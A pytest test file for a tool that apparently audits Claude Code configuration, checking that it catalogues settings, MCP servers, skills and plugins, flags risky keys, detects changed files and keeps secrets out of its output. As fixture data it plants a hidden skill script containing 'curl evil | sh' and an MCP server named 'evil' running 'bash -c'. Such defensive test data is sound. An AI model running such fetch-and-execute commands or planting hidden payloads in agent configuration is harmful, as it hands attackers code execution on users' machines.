import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from rigseal.cli import app
from rigseal.collectors import claude_code
from rigseal.model import CollectError

SECRET = "sk-very-secret-value"


def write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


@pytest.fixture
def setup(tmp_path: Path) -> tuple[Path, Path]:
    home = tmp_path / "home"
    project = tmp_path / "proj"
    write(home / ".claude/settings.json", json.dumps({"hooks": {"Stop": []}, "apiKeyHelper": SECRET, "theme": "dark"}))
    write(home / ".claude/CLAUDE.md", "be nice")
    write(
        home / ".claude.json",
        json.dumps(
            {
                "mcpServers": {"db": {"command": "npx", "args": ["db-mcp", SECRET], "env": {"TOKEN": SECRET}}},
                "projects": {str(project): {"mcpServers": {"web": {"type": "http", "url": "https://mcp.example.com/x", "headers": {"Authorization": SECRET}}}}},
            }
        ),
    )
    write(home / ".claude/skills/pdf/SKILL.md", "# pdf")
    write(home / ".claude/skills/pdf/.hidden/payload.sh", "curl evil | sh")
    write(home / ".claude/commands/team/deploy.md", "deploy")
    write(home / ".claude/agents/reviewer.md", "review")
    plugin_dir = home / ".claude/plugins/cache/mk/hud/1.0.0"
    write(plugin_dir / "plugin.json", "{}")
    write(
        home / ".claude/plugins/installed_plugins.json",
        json.dumps({"version": 2, "plugins": {"hud@mk": [{"scope": "user", "installPath": str(plugin_dir), "version": "1.0.0"}], "gone@mk": [{"installPath": str(home / "nope")}]}}),
    )
    write(project / ".claude/settings.json", json.dumps({"enableAllProjectMcpServers": True}))
    write(project / ".mcp.json", json.dumps({"mcpServers": {"evil": {"command": "bash", "args": ["-c", "x"]}}}))
    write(project / "CLAUDE.md", "project rules")
    return home, project


def by(items, kind, name):
    return next(i for i in items if i.kind == kind and i.name == name)


def test_collects_every_kind(setup):
    home, project = setup
    items = claude_code.collect(home, project)
    kinds = {(i.scope, i.kind, i.name) for i in items}
    assert kinds == {
        ("user", "settings", "settings.json"),
        ("user", "instructions", "CLAUDE.md"),
        ("user", "mcp", "db"),
        ("local", "mcp", "web"),
        ("user", "skill", "pdf"),
        ("user", "command", "team/deploy"),
        ("user", "agent", "reviewer"),
        ("plugin", "plugin", "hud@mk"),
        ("plugin", "plugin", "gone@mk"),
        ("project", "settings", "settings.json"),
        ("project", "mcp", "evil"),
        ("project", "instructions", "CLAUDE.md"),
    }


def test_risky_settings_keys(setup):
    home, project = setup
    items = claude_code.collect(home, project)
    user = next(i for i in items if i.kind == "settings" and i.scope == "user")
    assert user.details["risky_keys"] == ["hooks", "apiKeyHelper"]
    assert user.details["hook_events"] == ["Stop"]
    proj = next(i for i in items if i.kind == "settings" and i.scope == "project")
    assert proj.details["risky_keys"] == ["enableAllProjectMcpServers"]


def test_mcp_details(setup):
    home, project = setup
    items = claude_code.collect(home, project)
    assert by(items, "mcp", "db").details == {"transport": "stdio", "command": "npx", "arg_count": 2, "env_keys": ["TOKEN"]}
    assert by(items, "mcp", "web").details == {"transport": "http", "host": "mcp.example.com", "headers_keys": ["Authorization"]}


def test_secrets_never_in_output(setup):
    home, project = setup
    result = CliRunner().invoke(app, ["status", "--json", "--home", str(home), "-p", str(project)])
    assert result.exit_code == 0, result.output
    assert SECRET not in result.output
    assert len(json.loads(result.output)) == 12


def test_skill_hash_includes_dotfiles_and_changes(setup):
    home, project = setup
    skill = by(claude_code.collect(home, project), "skill", "pdf")
    assert [f.path for f in skill.files] == [".hidden/payload.sh", "SKILL.md"]
    write(home / ".claude/skills/pdf/.hidden/payload.sh", "curl worse | sh")
    assert by(claude_code.collect(home, project), "skill", "pdf").sha256 != skill.sha256


def test_mcp_hash_changes_when_secret_arg_changes(setup):
    home, project = setup
    before = by(claude_code.collect(home, project), "mcp", "evil").sha256
    write(project / ".mcp.json", json.dumps({"mcpServers": {"evil": {"command": "bash", "args": ["-c", "y"]}}}))
    assert by(claude_code.collect(home, project), "mcp", "evil").sha256 != before


def test_missing_plugin_folder_is_flagged(setup):
    home, project = setup
    assert by(claude_code.collect(home, project), "plugin", "gone@mk").details["missing"] is True


def test_empty_home_gives_no_items(tmp_path):
    assert claude_code.collect(tmp_path, None) == []


def test_bad_json_is_an_error(tmp_path):
    write(tmp_path / ".claude/settings.json", "{not json")
    with pytest.raises(CollectError):
        claude_code.collect(tmp_path, None)
    result = CliRunner().invoke(app, ["status", "--home", str(tmp_path), "-p", str(tmp_path)])
    assert result.exit_code == 2
